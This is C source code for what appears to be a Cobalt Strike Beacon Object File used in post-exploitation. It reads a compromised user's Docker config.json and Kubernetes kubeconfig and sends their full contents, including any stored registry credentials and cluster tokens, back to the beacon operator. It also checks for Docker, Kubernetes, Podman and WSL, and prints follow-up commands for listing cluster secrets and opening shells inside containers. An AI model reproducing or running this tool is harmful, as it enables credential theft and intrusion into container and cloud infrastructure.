#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetFileSize(HANDLE, PDWORD);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetEnvironmentVariableA(LPCSTR, LPSTR, DWORD);
DECLSPEC_IMPORT size_t WINAPI MSVCRT$strlen(const char*);
DECLSPEC_IMPORT void WINAPI MSVCRT$memcpy(void*, const void*, size_t);
DECLSPEC_IMPORT int WINAPI MSVCRT$strcmp(const char*, const char*);

void go(char *args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    
    int mode = BeaconDataInt(&parser);
    
    if (mode == 0) {
        // Docker Desktop config
        char homePath[MAX_PATH] = {0};
        KERNEL32$GetEnvironmentVariableA("USERPROFILE", homePath, MAX_PATH);
        
        char dockerPath[MAX_PATH] = {0};
        if (homePath[0]) {
            MSVCRT$memcpy(dockerPath, homePath, MSVCRT$strlen(homePath));
            MSVCRT$memcpy(dockerPath + MSVCRT$strlen(homePath), "\\.docker\\config.json", 20);
        }
        
        HANDLE hFile = KERNEL32$CreateFileA(dockerPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD fileSize = KERNEL32$GetFileSize(hFile, NULL);
            if (fileSize > 0 && fileSize < 131072) {
                char buffer[131072] = {0};
                DWORD bytesRead = 0;
                KERNEL32$ReadFile(hFile, buffer, fileSize < 131071 ? fileSize : 131071, &bytesRead, NULL);
                buffer[bytesRead] = 0;
                BeaconPrintf(CALLBACK_OUTPUT, "=== Docker Config ===");
                BeaconPrintf(CALLBACK_OUTPUT, "%s", buffer);
            }
            KERNEL32$CloseHandle(hFile);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] No Docker config found");
        }
    }
    else if (mode == 1) {
        // K8s config
        char homePath[MAX_PATH] = {0};
        KERNEL32$GetEnvironmentVariableA("USERPROFILE", homePath, MAX_PATH);
        
        char k8sPath[MAX_PATH] = {0};
        if (homePath[0]) {
            MSVCRT$memcpy(k8sPath, homePath, MSVCRT$strlen(homePath));
            MSVCRT$memcpy(k8sPath + MSVCRT$strlen(homePath), "\\.kube\\config", 12);
        }
        
        HANDLE hFile = KERNEL32$CreateFileA(k8sPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD fileSize = KERNEL32$GetFileSize(hFile, NULL);
            if (fileSize > 0 && fileSize < 131072) {
                char buffer[131072] = {0};
                DWORD bytesRead = 0;
                KERNEL32$ReadFile(hFile, buffer, fileSize < 131071 ? fileSize : 131071, &bytesRead, NULL);
                buffer[bytesRead] = 0;
                BeaconPrintf(CALLBACK_OUTPUT, "=== Kubernetes Config ===");
                BeaconPrintf(CALLBACK_OUTPUT, "%s", buffer);
            }
            KERNEL32$CloseHandle(hFile);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] No Kubernetes config found");
        }
    }
    else if (mode == 2) {
        // Container environment
        BeaconPrintf(CALLBACK_OUTPUT, "=== Container Detection ===");
        
        // Check for Docker
        char dockerSock[] = "\\\\.\\pipe\\docker_engine";
        HANDLE hFile = KERNEL32$CreateFileA(dockerSock, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Docker Engine pipe found: %s", dockerSock);
            KERNEL32$CloseHandle(hFile);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] Docker Engine pipe not found");
        }
        
        // Check for container env vars
        char envVar[MAX_PATH] = {0};
        KERNEL32$GetEnvironmentVariableA("KUBERNETES_SERVICE_HOST", envVar, MAX_PATH);
        if (envVar[0]) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Running inside Kubernetes (KUBERNETES_SERVICE_HOST=%s)", envVar);
        }
        
        KERNEL32$GetEnvironmentVariableA("DOCKER_HOST", envVar, MAX_PATH);
        if (envVar[0]) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Docker host: %s", envVar);
        }
        
        KERNEL32$GetEnvironmentVariableA("PODMAN_", envVar, MAX_PATH);
        if (envVar[0]) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Podman detected");
        }
        
        // Check for WSL
        KERNEL32$GetEnvironmentVariableA("WSL_DISTRO_NAME", envVar, MAX_PATH);
        if (envVar[0]) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] WSL distribution: %s", envVar);
        }
    }
    else if (mode == 3) {
        // List container images via CLI
        BeaconPrintf(CALLBACK_OUTPUT, "=== Container Commands ===");
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Docker:");
        BeaconPrintf(CALLBACK_OUTPUT, "    docker images");
        BeaconPrintf(CALLBACK_OUTPUT, "    docker ps -a");
        BeaconPrintf(CALLBACK_OUTPUT, "    docker inspect <container>");
        BeaconPrintf(CALLBACK_OUTPUT, "    docker exec -it <container> /bin/sh");
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Kubernetes:");
        BeaconPrintf(CALLBACK_OUTPUT, "    kubectl get pods --all-namespaces");
        BeaconPrintf(CALLBACK_OUTPUT, "    kubectl get secrets --all-namespaces");
        BeaconPrintf(CALLBACK_OUTPUT, "    kubectl describe pod <pod> -n <ns>");
        BeaconPrintf(CALLBACK_OUTPUT, "    kubectl exec -it <pod> -- /bin/sh");
    }
}
